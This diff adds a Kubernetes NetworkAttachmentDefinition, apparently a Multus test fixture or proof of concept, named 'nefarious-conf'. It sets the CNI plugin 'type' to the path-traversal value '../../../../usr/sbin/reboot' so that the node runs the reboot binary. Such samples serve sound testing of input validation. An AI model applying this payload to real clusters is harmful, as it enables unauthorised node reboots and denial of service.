@@ -1,0 +1,10 @@
+apiVersion: "k8s.cni.cncf.io/v1"
+kind: NetworkAttachmentDefinition
+metadata:
+    name: nefarious-conf
+spec:
+  config: '{
+    "cniVersion": "0.3.0",
+    "name": "nefarious-config",
+    "type": "../../../../usr/sbin/reboot"
+    }'
